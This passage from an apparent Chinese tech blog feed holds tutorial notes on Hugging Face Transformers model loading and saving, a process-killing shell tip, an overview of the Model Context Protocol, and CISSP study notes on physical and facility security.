vision</td><td>pipeline(task&#x3D;“image-classification”)</td></tr><tr><td>图像分割</td><td>为图像中每个独立的像素分配标签（支持语义、全景和实例分割）</td><td>Computer vision</td><td>pipeline(task&#x3D;“image-segmentation”)</td></tr><tr><td>目标检测</td><td>预测图像中目标对象的边界框和类别</td><td>Computer vision</td><td>pipeline(task&#x3D;“object-detection”)</td></tr><tr><td>音频分类</td><td>给音频文件分配一个标签</td><td>Audio</td><td>pipeline(task&#x3D;“audio-classification”)</td></tr><tr><td>自动语音识别</td><td>将音频文件中的语音提取为文本</td><td>Audio</td><td>pipeline(task&#x3D;“automatic-speech-recognition”)</td></tr><tr><td>视觉问答</td><td>给定一个图像和一个问题，正确地回答有关图像的问题</td><td>Multimodal</td><td>pipeline(task&#x3D;“vqa”)</td></tr></tbody></table><h3 id="AutoClass"><a href="#AutoClass" class="headerlink" title="AutoClass"></a>AutoClass</h3><p>AutoModelForSequenceClassification 和 AutoTokenizer 一起支持在上面用到的 pipeline()</p><p>AutoClass 是一个能够通过预训练模型的名称或路径自动查找其架构的快捷方式</p><h4 id="AutoTokenizer"><a href="#AutoTokenizer" class="headerlink" title="AutoTokenizer"></a>AutoTokenizer</h4><p>分词器负责预处理文本，将文本转换为用于输入模型的数字数组</p><h5 id="tokenizer"><a href="#tokenizer" class="headerlink" title="tokenizer"></a>tokenizer</h5><h6 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h6><p><strong>max_length</strong>：模型支持的最大序列长度，超过后会被截断</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">max_length</span>=<span class="hljs-number">512</span><br></code></pre></td></tr></table></figure><p><strong>padding：</strong> True</p><p>自动对批次中的文本进行填充（Padding），使所有序列长度一致</p><p>填充规则：</p><ul><li>按照 padding_side ，默认为 right，在右侧填充</li><li>填充符号由 pad_token 决定</li></ul><p><strong>truncation</strong>：True </p><p>自动截断超过 max_length 的序列</p><p>截断规则：</p><ul><li>按照 truncation_side ，默认为 right ，从右侧截断</li><li>截断后保留的 token 数量不超过 max_length</li></ul><p><strong>return_tensors</strong></p><p>指定返回张量的框架类</p><p>可选值：</p><ul><li><p>pt：返回 PyTorch 张量（torch.Tensor）</p><p>返回值中包含 input_ids、attention_mask 字段</p><p>input_ids：每个 token 的 ID（包括特殊 token 如 [CLS] 和 [SEP]）</p><p>attention_mask：标记哪些位置是有效 token（1），哪些是填充（0）</p></li><li><p>tf：返回 TensorFlow 张量（tf.Tensor）</p></li><li><p>np：返回 NumPy 数组（np.ndarray）</p></li></ul><h4 id="AutoModel"><a href="#AutoModel" class="headerlink" title="AutoModel"></a>AutoModel</h4><h5 id="Pytorch"><a href="#Pytorch" class="headerlink" title="Pytorch"></a>Pytorch</h5><p>Transformers 提供了一种简单统一的方式来加载预训练的实例</p><p>需要为任务选择正确的 AutoModel</p><p>文本（或序列）分类，加载 AutoModelForSequenceClassification</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">from transformers import AutoModelForSequenceClassification<br>model_name <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nlptown/bert-base-multilingual-uncased-sentiment&quot;</span><br>pt_model <span class="hljs-operator">=</span> AutoModelForSequenceClassification.from_pretrained(model_name)<br></code></pre></td></tr></table></figure><h5 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h5><p>Transformers 提供了一种简单统一的方式来加载预训练的实例</p><p>需要为任务选择正确的 TFAutoModel</p><p>文本（或序列）分类，加载 TFAutoModelForSequenceClassification</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">from transformers import TFAutoModelForSequenceClassification<br>model_name <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nlptown/bert-base-multilingual-uncased-sentiment&quot;</span><br>tf_model <span class="hljs-operator">=</span> TFAutoModelForSequenceClassification.from_pretrained(model_name)<br></code></pre></td></tr></table></figure><h4 id="保存模型"><a href="#保存模型" class="headerlink" title="保存模型"></a>保存模型</h4><p>模型微调后，可以保存模型，并在需要使用时重新加载</p><h5 id="Pytorch-1"><a href="#Pytorch-1" class="headerlink" title="Pytorch"></a>Pytorch</h5><p><strong>保存模型</strong></p><p>pt_model.save_pretrained(pt_save_directory)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>pt_save_directory = <span class="hljs-string">&quot;./pt_save_pretrained&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>tokenizer.save_pretrained(pt_save_directory)<br>(<span class="hljs-string">&#x27;./pt_save_pretrained/tokenizer_config.json&#x27;</span>, <span class="hljs-string">&#x27;./pt_save_pretrained/special_tokens_map.json&#x27;</span>, <span class="hljs-string">&#x27;./pt_save_pretrained/vocab.txt&#x27;</span>, <span class="hljs-string">&#x27;./pt_save_pretrained/added_tokens.json&#x27;</span>, <span class="hljs-string">&#x27;./pt_save_pretrained/tokenizer.json&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>pt_model.save_pretrained(pt_save_directory)<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">(transformers) [root@ transformers]<span class="hljs-comment"># ls -lat pt_save_pretrained/</span><br>total 657156<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 669464588 </span>May<span class="hljs-number"> 19 </span>16:20 model.safetensors<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root     <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 19 </span>16:20 .<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 1109 </span>May<span class="hljs-number"> 19 </span>16:20 config.json<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 2563623 </span>May<span class="hljs-number"> 19 </span>16:20 tokenizer.json<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 871891 </span>May<span class="hljs-number"> 19 </span>16:20 vocab.txt<br>drwxr-xr-x<span class="hljs-number"> 3 </span>root root     <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 19 </span>16:20 ..<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 125 </span>May<span class="hljs-number"> 19 </span>16:20 special_tokens_map.json<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 1290 </span>May<span class="hljs-number"> 19 </span>16:20 tokenizer_config.json<br></code></pre></td></tr></table></figure><p><strong>加载模型</strong></p><p>PreTrainedModel.from_pretrained()</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">pt_model</span> = AutoModelForSequenceClassification.from_pretrained(<span class="hljs-string">&quot;./pt_save_pretrained&quot;</span>)<br></code></pre></td></tr></table></figure><h5 id="TensorFlow-1"><a href="#TensorFlow-1" class="headerlink" title="TensorFlow"></a>TensorFlow</h5><p><strong>保存模型</strong></p><p>TFPreTrainedModel.save_pretrained()</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tf_save_directory = <span class="hljs-string">&quot;./tf_save_pretrained&quot;</span><br>tokenizer<span class="hljs-selector-class">.save_pretrained</span>(tf_save_directory)<br>tf_model<span class="hljs-selector-class">.save_pretrained</span>(tf_save_directory)<br></code></pre></td></tr></table></figure><p><strong>加载模型</strong></p><p>TFPreTrainedModel.from_pretrained()</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tf_model</span> = TFAutoModelForSequenceClassification.from_pretrained(<span class="hljs-string">&quot;./tf_save_pretrained&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="自定义模型构建"><a href="#自定义模型构建" class="headerlink" title="自定义模型构建"></a>自定义模型构建</h3>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>aisec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>aisec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kill_most_process</title>
    <link href="/2025/05/09/yunwei/yunweitips/kill_most_process/"/>
    <url>/2025/05/09/yunwei/yunweitips/kill_most_process/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="使用-ps-grep-awk-xargs"><a href="#使用-ps-grep-awk-xargs" class="headerlink" title="使用 ps + grep + awk + xargs"></a><strong>使用 <code>ps</code> + <code>grep</code> + <code>awk</code> + <code>xargs</code></strong></h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">ps aux | <span class="hljs-keyword">grep</span> &lt;关键词&gt; | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweitips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/05/06/security/aisec/ai-functioncall/"/>
    <url>/2025/05/06/security/aisec/ai-functioncall/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ai-mcp</title>
    <link href="/2025/05/06/security/aisec/ai-mcp/"/>
    <url>/2025/05/06/security/aisec/ai-mcp/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="1-简述"><a href="#1-简述" class="headerlink" title="1 简述"></a>1 简述</h1><p>Anthropic 发布</p><p>Model Context Protocol 模型上下文协议</p><p><strong>旨在统一规范大语言模型与外部数据源和工具之间的通信</strong>，建立 AI  与外部数据、工具交互的标准，类似中间件</p><h1 id="2-架构"><a href="#2-架构" class="headerlink" title="2 架构"></a>2 架构</h1><h2 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h2><h3 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h3><p>本地运行的 AI 应用环境，为执行基于 AI 的任务提供环境。</p><p>托管 MCP 客户端，确保与外部 MCP 服务器的通信。</p><h3 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h3><p>MCP 客户端，在主机和 MCP Server 中保持连接，例如：Claude 客户端、Cline等应用程序都内置 MCP Client 客户端。</p><p>MCP 客户端通过传输层与 MCP 服务器通信，促进安全、可靠的数据交换以及主机与外部资源之间的顺畅交互。</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>MCP 插件所对应的服务端。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h4><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><p>启用外部操作</p><p>允许 MCP 服务器调用外部服务和 API ，代表 AI 模型执行操作。</p><p>通过上下文自主选择和调用适当的工具，遵循标准化的供应-消费模型，使工具模块化、可重用。</p><h5 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h5><p>向 AI 模型暴露数据。</p><p>资源提供对结构化和非结构化数据集的访问，数据集可以由 MCP 服务器暴露给 AI 模型。</p><h5 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h5><p>用于工作流程优化的可重用模版。</p><p>提示是 MCP 服务器生成和维护的预定义模版和工作流程，用于优化 AI 响应和简化重复性任务。</p><h3 id="通信流程"><a href="#通信流程" class="headerlink" title="通信流程"></a>通信流程</h3><p>用户 -&gt;  Host -&gt; Client -&gt; Server</p><p>结构化过程</p><p>1、客户端向服务器查询功能的初始请求</p><p>2、服务器会初始响应回复，列出可用的工具、资源和提示</p><p>3、客户端利用可用的工具、资源和提示</p><p>4、建立连接后，持续交换通知。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>aisec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>aisec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>10-域3安全架构与工程+域7安全运营-物理安全要求</title>
    <link href="/2025/04/30/security/seccert/cissp/10-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%E8%A6%81%E6%B1%82/"/>
    <url>/2025/04/30/security/seccert/cissp/10-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%E8%A6%81%E6%B1%82/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="10-1-站点与设施设计的安全原则"><a href="#10-1-站点与设施设计的安全原则" class="headerlink" title="10.1 站点与设施设计的安全原则"></a>10.1 站点与设施设计的安全原则</h1><h2 id="10-1-1-安全设施计划"><a href="#10-1-1-安全设施计划" class="headerlink" title="10.1.1 安全设施计划"></a>10.1.1 安全设施计划</h2><p>安全设施计划（secure facility plan）需要列出组织的安全需求，并突出用于保障安全的方法及机制。</p><p>计划制订方法：</p><ul><li>风险评估</li><li>关键路径分析</li></ul><p>关键路径分析</p><p>关键路径分析（critical path analysis）是一项系统性工作，用于找出任务关键型应用程序、流程、运营以及所有必要的支持元素间的关系。</p><p>针对已完成的或潜在的技术融合的评估。</p><p>技术融合（technology convergence）指的是各种技术、解决方案、使用程序及系统，随时间的推移而发展、合并的趋势。</p><p>技术融合可以提高效率、节约成本，但是容易产生单点故障。</p><p>信息安全人员应该参与站点与设施的设计。</p><p>安全设施计划基于分层防御模型，安全机制被定位为串联允许。</p><h2 id="10-1-2-站点选择"><a href="#10-1-2-站点选择" class="headerlink" title="10.1.2 站点选择"></a>10.1.2 站点选择</h2><p>站点的选择始终应该优先考虑安全要去。</p><p>资产安全是否得到了确保在很大程度上取决于站点的安全性。</p><p>站点选择的关键要素有可见性、周围环境和构成、区域的便利性等。</p><p>工业伪装（industrial camouflage）是指通过提供一个让人信服的外表替代方案来掩盖或隐藏设施的实际功能、目标或运营业务。</p><h2 id="10-1-3-设施设计"><a href="#10-1-3-设施设计" class="headerlink" title="10.1.3 设施设计"></a>10.1.3 设施设计</h2><p>安全的首要任务应该始终保护人员的生命和安全。</p><p>要确保所有设施设计和物理安全控制服务所有适用的法律、法规。</p><p>需要重点考虑的因素：<br>可燃性</p><p>火警等级</p><p>建筑材料</p><p>负载率</p><p>布局</p><p>对墙、门、天花板、地板、HVAC、电力、供水、排水、燃气等项目的控制。</p><p>需要重点评估的方面：<br>暴力入侵</p><p>紧急通道</p><p>门禁</p><p>出入口方向</p><p>警报的使用</p><p>传导性</p><h3 id="CPTED"><a href="#CPTED" class="headerlink" title="CPTED"></a>CPTED</h3><p>CPTED（通过环境设计预防犯罪）</p><h4 id="核心原则"><a href="#核心原则" class="headerlink" title="核心原则"></a>核心原则</h4><p>可以有目的地对物理环境的设计进行管理、操纵和精心编排，以便影响或改变这些区域中人们的行为，从而减少犯罪，并减少人们对犯罪的恐惧。</p><h4 id="主要策略"><a href="#主要策略" class="headerlink" title="主要策略"></a>主要策略</h4><h5 id="自然环境访问控制"><a href="#自然环境访问控制" class="headerlink" title="自然环境访问控制"></a>自然环境访问控制</h5><p>通过设置入口，使用围栏和护柱，以及设置灯光，以对进出建筑物的人员进行微妙的引导。</p><p>内部扩展：<br>创建安全区域来区分一般区域和需要特定级别或工作职责才能进入的更高安全区。</p><h5 id="自然环境监视"><a href="#自然环境监视" class="headerlink" title="自然环境监视"></a>自然环境监视</h5><p>自然环境监视是一种通过增加罪犯被观察到的机会来使其感到不安的手段。</p><p>通过开放和无障碍的外部区域来实现，尤其是入口周围，应确保其容易被人看到。</p><p>走道和漏洞应该是开放式的。</p><p>所有区域应该全天（尤其是在晚上）都有很好的照明。</p><h5 id="自然环境领域加固"><a href="#自然环境领域加固" class="headerlink" title="自然环境领域加固"></a>自然环境领域加固</h5><p>自然环境领域加固目的在于使该区域令人感觉像一个包容、关爱的社区。</p><p>可以通过装饰、旗帜、灯光、景观、公司标识展示、清洗可见的建筑物编号、装饰性的人行道和其他建筑物特征来实现。</p><p>CPTED 不能替代实际已有的防护措施。</p><p>传统的物理屏障和 CPTED   策略的混合可以提供预防性安全以及检测与威慑安全。</p><h1 id="10-2-实现站点与设施安全控制"><a href="#10-2-实现站点与设施安全控制" class="headerlink" title="10.2 实现站点与设施安全控制"></a>10.2 实现站点与设施安全控制</h1><h3 id="管理类物理安全控制"><a href="#管理类物理安全控制" class="headerlink" title="管理类物理安全控制"></a>管理类物理安全控制</h3><p>设施建造与选择</p><p>站点管理</p><p>建筑设计</p><p>人员控制</p><p>安全意识培训</p><p>应急响应与流程</p><h3 id="技术类物理安全控制"><a href="#技术类物理安全控制" class="headerlink" title="技术类物理安全控制"></a>技术类物理安全控制</h3><p>建筑访问控制</p><p>入侵检测</p><p>警报</p><p>视频监控系统</p><p>监视</p><p>HVAC 的电力供应</p><p>火警探测与消防</p><h3 id="现场类物理安全控制"><a href="#现场类物理安全控制" class="headerlink" title="现场类物理安全控制"></a>现场类物理安全控制</h3><p>围栏</p><p>照明</p><p>门锁</p><p>建筑材料</p><h3 id="各类控制的功能顺序"><a href="#各类控制的功能顺序" class="headerlink" title="各类控制的功能顺序"></a>各类控制的功能顺序</h3><p>威慑</p><p>拒绝</p><p>检测</p><p>延迟</p><p>判定</p><p>决定</p><h2 id="10-2-1-设备故障"><a href="#10-2-1-设备故障" class="headerlink" title="10.2.1 设备故障"></a>10.2.1 设备故障</h2><p>组织可采用多种形式预防设备故障</p><p>1、某些非关键场景</p><p>知道  48 小时内从哪里能购买配件，并进行更换即可。</p><p>2、某些情况下</p><p>必须在现场维修待更换部件</p><p>维修系统并将其恢复到可用状态的响应时间与付出的费用是成比例的。</p><p>3、另外一些情况下</p><p>无法在现场进行维修更换工作</p><p>务必与硬件厂商签订服务水平协议 （service-level agreement，SLA）</p><p>设备故障时导致可用性丧失的常见原因。</p><p>必须了解每项资产和业务流程的关键性以及相关的<strong>允许中断窗口（AIW）</strong>、<strong>服务交付目标（SDO）</strong>和<strong>最大允许&#x2F;容忍中断时间（MTD&#x2F;MTO）</strong></p><p>老旧的硬件，应该安排其定期进行更换&#x2F;维修。</p><p>维修时间的安排应该基于每个硬件预先允许的 <strong>MTTF（mean time to failure，平均故障时间）</strong>与 <strong>MTTR （mean time to repair，平均恢复时间）</strong>或者业界内最佳实践的硬件管理周期。</p><p>MTTF 是特定操作环境下设备典型的预期寿命，需要确保所有设备在 MTTF 失效之前都能得到及时更换。</p><p>MTTR 是对设备进行修复所需的平均时间长度。</p><p><strong>MTBF（mean time between failures，平均故障间隔时间）</strong>：第一次与后续的任何故障之间的间隔时间估值。如果 MTTF 和 MTBF 值相同或接近，通常只列出 MTTF 来同时表示两个值。</p><h2 id="10-2-2-配线间"><a href="#10-2-2-配线间" class="headerlink" title="10.2.2 配线间"></a>10.2.2 配线间</h2><p>电缆设备管理策略用于定义设施内网络布线和相关设备的物理结构和部署。</p><h3 id="综合布线"><a href="#综合布线" class="headerlink" title="综合布线"></a>综合布线</h3><p>互联线缆与连接装置（跳线箱、接线板和交换机）的集合。</p><h4 id="综合布线组成要素"><a href="#综合布线组成要素" class="headerlink" title="综合布线组成要素"></a>综合布线组成要素</h4><h5 id="接入设施"><a href="#接入设施" class="headerlink" title="接入设施"></a>接入设施</h5><p>接入设施（entrance facility），也被称为分界点或 MDF ，也是通信服务商连接到建筑物内部网络的接入点</p><h5 id="设备间"><a href="#设备间" class="headerlink" title="设备间"></a>设备间</h5><p>设备间（equipment room），建筑物的主布线间，通常与接入设施连接或相邻</p><h5 id="骨干配线系统"><a href="#骨干配线系统" class="headerlink" title="骨干配线系统"></a>骨干配线系统</h5><p>骨干配线系统（backbone distribution system），为设备间和通信间提供电缆连接。</p><h5 id="配线间"><a href="#配线间" class="headerlink" title="配线间"></a>配线间</h5><p>配线间（wiring closet）为组网设备和布线系统提供空间来满足大型建筑中某一层或区域内的连接需要，也充当骨干配线系统和水平配线系统间的连接点。</p><p>配线间也被称为布线室、主配线架（MDF）、中间配线架（IDF）和电信机房，也被称为 <strong>中间配线设施</strong>。</p><h5 id="水平配线系统"><a href="#水平配线系统" class="headerlink" title="水平配线系统"></a>水平配线系统</h5><p>水平配线系统（horizontal distribution system），提供通信机房与工作区域之间的连接。</p><p>包括布线、交叉连接模块、布线板、硬件支持设施</p><h3 id="分布电缆保护系统（PDS）"><a href="#分布电缆保护系统（PDS）" class="headerlink" title="分布电缆保护系统（PDS）"></a>分布电缆保护系统（PDS）</h3><p>是电缆免受未经授权的访问或损坏的手段。</p><p>目标是阻止违规行为、检测访问尝试并防止电缆受损。</p><p>实施要素：</p><ul><li>保护导管</li><li>密封连接</li><li>定期人员检查</li></ul><p>配线间也是方便连接多个楼层的地方。</p><p>配线间也常用于存放、管理建筑物中其他多种重要设施的布线</p><h3 id="配线间安全策略"><a href="#配线间安全策略" class="headerlink" title="配线间安全策略"></a>配线间安全策略</h3><ul><li>永远不要把配线间用作一般的储物区</li><li>配备充足的门锁，必要时采用生物因素</li><li>保持该区域的整洁</li><li>该区域中不能存储易燃品</li><li>配备视频监控设备以监视配线间内的活动</li><li>使用开门传感器进行日志记录</li><li>钥匙只能由获得授权的管理员保管</li><li>对配线间进行常规的现场巡视以确保安全</li><li>将配线间纳入组织的环境管理和监控中</li></ul><p>应该将配线间的安全策略与访问限制同步告知大楼的物业管理部门，可以进一步减少非法的访问企图。</p><h2 id="10-2-3-服务期间与数据中心"><a href="#10-2-3-服务期间与数据中心" class="headerlink" title="10.2.3 服务期间与数据中心"></a>10.2.3 服务期间与数据中心</h2><p>服务器间、数据中心、通信机房、服务器柜以及 IT 柜是封闭的、受限的和受保护的空间，用于放置重要的服务器与网络设备。</p><p>集中式服务器环境不需要适宜人员常驻。</p><p>数据中心可将气化隔氧的哈龙替代物（halon-substiture）用于火警探测以及灭火系统、最低 1小时耐火级别的墙，以及低温、低照明或无照明、狭窄的设备空间。</p><p>服务器间应该位于建筑的核心位置，避免一楼或顶楼和地下室，远离水、燃气和污水管道。</p><p>数据中心可能由组织单独拥有与管理，也可能租用数据中心提供商的服务。</p><p>一个数据中心可能是单租户配置，也可能是多租户配置。</p><p>访问控制技术</p><p>智能卡&#x2F;哑卡</p><p>接近式装置</p><p>读卡器</p><p>生物特征识别</p><p>入侵检测系统（IDS）</p><p>基于纵深防御的设计</p><h3 id="智能卡和胸卡"><a href="#智能卡和胸卡" class="headerlink" title="智能卡和胸卡"></a>智能卡和胸卡</h3><p>胸卡、身份识别卡和安全 ID 是物理身份识别和&#x2F;或电子访问控制设备的形式。</p><p><strong>胸卡</strong>简单，可以根据设施或分类级别进行颜色编码，通常包括照片、磁条、二维码或条形码、智能卡芯片、RFID、NFC等个人信息。</p><p><strong>智能卡（smartcard）</strong>复杂，可以是一种信用卡大小的身份标识、胸卡，也可以是带嵌入式磁条、条形码、集成电路芯片的安全通行证。</p><p>智能卡相关的短语与术语：</p><ul><li>包含集成电路（IC）的身份令牌</li><li>处理器 IC 卡</li><li>支持 ISO 7816 接口的 IC 卡</li></ul><p>智能卡通常被视为一种可靠的安全解决方案，但也存在弱点和脆弱性。</p><p>智能卡最常用的多因素形式是 PIN 码。</p><p>智能卡可用于双重（或多重）目的。</p><p>磁条卡（memory cards）是带机器可读磁条的 ID卡。</p><p>可以存储少量数据，不能处理数据。</p><p>容易复制，不能在安全环境中用于验证的目的。</p><p>胸卡可用于识别或身份认证。</p><p>离职流程需要收回并销毁胸卡。</p><p>胸卡应该设计安全功能，以尽量降低入侵者进行替换或复制的能力。</p><h3 id="接近式设备"><a href="#接近式设备" class="headerlink" title="接近式设备"></a>接近式设备</h3><p>接近式设备（proximity device）可能是一种无源设备、磁场供电设备或应答器。</p><p>由授权用户佩戴或持有，接近读卡器时，读卡器确定持有者身份和授权。</p><p><strong>无源设备</strong>没有有源电子器件，反射或改变读卡器设备产生的电磁场触发告警。</p><p><strong>磁场供电设备</strong>内装有电子器件，通过读卡器产生的电磁场时，利用电磁场产生的电能供电。例如：射频识别（RFID）。</p><p><strong>应答器</strong>一种自供电设备，发射信号被读卡器读取验证。</p><h2 id="10-2-4-入侵检测系统"><a href="#10-2-4-入侵检测系统" class="headerlink" title="10.2.4 入侵检测系统"></a>10.2.4 入侵检测系统</h2><p>入侵检测系统（IDS）有自动的，也有人工的。</p><p>IDS 用于探测：</p><ul><li>入侵、破坏或攻击企图</li><li>是否使用了未经授权的入口</li><li>是否在未授权及非正常时间内发生特殊事件</li></ul><p>监视真实活动的入侵检测系统包括：</p><ul><li>保安</li><li>自动访问控制</li><li>动作探测器</li><li>其他专业监视技术</li></ul><p>物理入侵检测系统也被称为“盗贼警报”，作用是探测非法活动并通知安保人员。</p><p>入侵检测系统包括<strong>检测周边破坏</strong>和<strong>内部运动</strong>的方法。</p><p>弱点：</p><p>1、电源</p><p>需要配备电力充足的备用电池，确保 24 小时正常工作。</p><p>2、通信</p><p>需要配备“心跳传感器”以进行线路监视。</p><h3 id="1-动作探测器"><a href="#1-动作探测器" class="headerlink" title="1. 动作探测器"></a>1. 动作探测器</h3><p>“动作探测器”或“动作传感器”  是一种在特定区域内感知运动或声音的装置。</p><p>常见种类：</p><ul><li>“数字动作传感器”监视受控区域内数字图案的变化。</li><li>“被动红外（PIR）或热量动作探测器”监视受控区域内热量级别与模式的变化。</li><li>“波动动作探测器”发射持续低频超声或高频微波信号，监视反射信息中的变化</li><li>“电容动作探测器” 感知被监视对象周围电场或磁场的变化。</li><li>“光电动作探测器” 感知受监视区域内可见光级别的变化，部署在没有窗户和光线的内部房间中。</li><li>“被动音频动作探测器” 监听被监视区域内是否有异常响声</li></ul><h3 id="2-入侵警报"><a href="#2-入侵警报" class="headerlink" title="2. 入侵警报"></a>2. 入侵警报</h3><p>“警报” 是一种独立的安全措施，能够启动防护机制，并且发出通知信息。</p><ul><li><p>阻止警报（deterrent alarms）</p><p>阻止手段：关闭附加门锁、关闭房门等</p><p>目的：进一步提升入侵或攻击的难度</p></li><li><p>驱除警报（repellent alarms）</p><p>驱除手段：拉响警报、警铃或打开照明</p><p>目的：警告入侵者或攻击者，阻止其恶意或穿越的行为，并迫使离开</p></li><li><p>通知警报（notification alarms）</p><p>手段：系统记录事件信息并通知管理员、安全警卫与执法人员。</p><p>目的：为了让安全人员及时赶到，抓获入侵者</p></li></ul><p>按照安装位置分类</p><ul><li><p>本地警报系统（local alarm system）</p><p>需要警报声足够强（可能高达 120 分贝），400英尺外也能听清</p><p>需要有安全警卫团队迅速响应警报</p></li><li><p>中心站系统（central station system）</p><p>本地是静默的，站区外监视代理会受到通知，安全团队及时响应</p></li><li><p>专有系统（proprietary system）</p><p>与中心站系统类似</p><p>现场配备专属安保人员，随时待命，响应事件</p></li><li><p>辅助站（auxiliary station）</p><p>可以附加到本地或中心警报系统中。</p></li></ul><p>安全方案中可以包含两种或多种入侵与警报系统。</p><h3 id="3-二次验证机制"><a href="#3-二次验证机制" class="headerlink" title="3. 二次验证机制"></a>3. 二次验证机制</h3><p>部署两种或多种探测器及传感器系统，或者在两种或多种触发机制连续动作时才发出警报，可以减少误报，提高准确性。</p><p>安全摄像头不是一种自动化探测-响应系统。</p><p>安全摄像头需要专人紧盯监控或直播。</p><p>安全摄像头拓展了安全警卫的有效探测距离，扩大了监视的范围。</p><p>安全摄像头可以用于自动系统触发后的二次或后续验证机制。</p><p>安全摄像头是一种威慑措施，检查事件记录信息是一种检测措施。</p><h2 id="10-2-5-摄像头"><a href="#10-2-5-摄像头" class="headerlink" title="10.2.5 摄像头"></a>10.2.5 摄像头</h2><p>视频监视&#x2F;监控、闭路电视（CCTV）和安全摄像头都是威慑不必要的活动并创建事件数字记录的手段。</p><p>监视出入口</p><p>监控重要资产和资源周围的活动</p><p>确保所有监控点视线清晰</p><p>可以是公开和明显的，提供威慑效果</p><p>可以是隐蔽的，提供监测效果</p><p>假冒或伪装的摄像头能以最小的成本实现威慑。</p><p>一些摄像头或增强型视频监控（EVS）系统能够检测目标，包括人脸、设备和武器。</p><p>一些摄像头可以通过识别运动来激活。</p><p>步态分析：</p><p>对一个人走路方式的评估，是一种生物特征认证或识别的形式。</p><p>可以用于步行路经认证和入侵检测。</p><p>是一种有效的生物学特征，可用于区分授权个人和未授权入侵者。</p><h2 id="10-2-6-访问滥用"><a href="#10-2-6-访问滥用" class="headerlink" title="10.2.6 访问滥用"></a>10.2.6 